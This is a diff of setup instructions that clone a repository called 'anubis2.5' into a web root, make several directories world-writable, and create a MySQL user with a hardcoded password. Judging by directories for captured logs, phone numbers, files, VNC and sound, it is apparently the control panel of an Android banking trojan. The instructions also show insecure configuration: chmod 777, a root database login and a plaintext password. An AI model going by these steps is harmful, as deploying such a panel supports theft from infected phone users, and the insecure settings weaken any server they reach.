@@ -26,11 +26,11 @@ git clone https://github.com/h4ckti2/anubis2.5
 mv anubis2.5 site
 mv site /var/www/html
 cd /var/www/html/site
-chmod 777anubis/application/datalogs/logs
-chmod 777anubis/application/datalogs/numers
-chmod 777anubis/application/datalogs/files
-chmod 777anubis/application/websocket/VNC
-chmod 777anubis/application/websocket/sound
+chmod 777 anubis/application/datalogs/logs
+chmod 777 anubis/application/datalogs/numers
+chmod 777 anubis/application/datalogs/files
+chmod 777 anubis/application/websocket/VNC
+chmod 777 anubis/application/websocket/sound
 mysql -u root -p
 password; root
 CREATE USER 'anubis'@'127.0.0.1' IDENTIFIED BY '@###$dd32234422';
